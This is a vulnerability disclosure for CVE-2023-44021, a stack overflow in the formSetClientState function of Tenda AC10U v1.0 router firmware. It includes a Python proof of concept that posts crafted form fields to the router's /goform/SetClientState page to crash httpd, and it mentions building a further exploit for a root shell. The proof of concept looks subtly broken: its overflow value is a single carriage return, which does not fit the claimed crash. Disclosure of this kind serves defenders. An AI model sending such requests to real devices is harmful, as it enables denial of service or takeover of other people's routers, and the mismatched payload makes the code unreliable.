# CVE-2023-44021

> vendor: Tenda
>
> product: AC10U v1.0
>
> version: US_AC10UV1.0RTL_V15.03.06.49_multi_TDE01
>
> type: Stack Overflow  

## Vulnerability Description

Tenda AC10U v1.0 US_AC10UV1.0RTL_V15.03.06.49_multi_TDE01 were discovered to contain a stack overflow in the formSetClientState function.

## Vulnerability Details

![1](https://github.com/aixiao0621/Tenda/blob/main/AC10U/2/1.png)

In function formSetClientState line 56, it reads in four user-provided parameters according to sprintf, and then are passed to the `var238` without any length check, which may lead to overflow of the stack-based buffer. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.

## Recurring vulnerabilities and POC

```python
import requests

host = "192.168.59.136"
cyclic = b"\r"

def exploit_formSetClientState():
    url = f"http://{host}/goform/SetClientState"
    data = {
        b"deviceId": b'a',
        b"limitEn": b'1',
       	b"limitSpeedUp": b'a',
        b"limitSpeed": cyclic.decode()
    }
    response = requests.post(url=url, data=data)
    print(response.text)

exploit_formSetClientState()
```

Run poc and you will see process httpd crash, segmentation fault. And you can write your own exp to get the root shell.
